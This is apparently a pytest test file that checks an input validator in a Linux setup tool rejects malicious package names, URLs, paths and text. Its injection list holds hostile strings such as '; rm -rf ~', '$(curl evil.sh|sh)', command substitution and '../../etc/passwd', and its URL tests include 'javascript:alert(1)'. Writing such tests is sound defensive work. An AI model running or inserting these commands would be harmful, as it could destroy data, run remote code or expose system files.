import pytest

from distroforge.core.validate import (
    ValidationError,
    check,
    check_email,
    check_https_url,
    check_path_within,
    check_text,
)

INJECTIONS = [
    "; rm -rf ~",
    "$(curl evil.sh|sh)",
    "`id`",
    "pkg && reboot",
    "--config=/tmp/evil",
    "-y",
    "pkg name",
    "pkg\nother",
    "",
    "../../etc/passwd",
]


@pytest.mark.parametrize("payload", INJECTIONS)
@pytest.mark.parametrize("kind", ["id", "package", "flatpak", "unit", "group", "module", "font", "binary"])
def test_identifiers_reject_injection(kind: str, payload: str) -> None:
    with pytest.raises(ValidationError):
        check(kind, payload)


@pytest.mark.parametrize(
    ("kind", "value"),
    [
        ("package", "containerd.io"),
        ("package", "dotnet-sdk-8.0"),
        ("package", "g++"),
        ("package", "libncursesw5-dev"),
        ("flatpak", "org.localsend.localsend_app"),
        ("flatpak", "io.gitlab.librewolf-community"),
        ("unit", "fstrim.timer"),
        ("sysctl_key", "fs.inotify.max_user_watches"),
        ("keyring", "docker.asc"),
    ],
)
def test_identifiers_accept_real_names(kind: str, value: str) -> None:
    assert check(kind, value) == value


@pytest.mark.parametrize(
    "url",
    [
        "http://example.com/x",
        "file:///etc/passwd",
        "ftp://example.com",
        "https://user:pw@example.com/x",
        "https://exa mple.com",
        "https://example.com/$(id)",
        'https://example.com/"x',
        "https:///nohost",
        "javascript:alert(1)",
    ],
)
def test_urls_must_be_plain_https(url: str) -> None:
    with pytest.raises(ValidationError):
        check_https_url(url)


def test_dnf_variables_allowed_only_when_requested() -> None:
    url = "https://download.docker.com/linux/fedora/$releasever/$basearch/stable"
    assert check_https_url(url, allow_vars=True) == url
    with pytest.raises(ValidationError):
        check_https_url(url)


def test_text_rejects_control_characters() -> None:
    with pytest.raises(ValidationError):
        check_text("line\nbreak")
    with pytest.raises(ValidationError):
        check_text("x" * 300, max_len=10)
    assert check_text("Hamid Alami") == "Hamid Alami"


def test_email() -> None:
    assert check_email("dev@example.com")
    for bad in ["nope", "a@b", "a b@c.d", "a@b@c.d"]:
        with pytest.raises(ValidationError):
            check_email(bad)


@pytest.mark.parametrize(
    "path",
    ["/etc/passwd", "/etc/apt/keyrings/../../shadow", "relative/x", "/etc/apt/keyrings", "/etc/apt/keyrings//x"],
)
def test_root_paths_confined(path: str) -> None:
    with pytest.raises(ValidationError):
        check_path_within(path, ("/etc/apt/keyrings",))


def test_root_path_inside_allowed_root() -> None:
    assert check_path_within("/etc/apt/keyrings/docker.asc", ("/etc/apt/keyrings",))
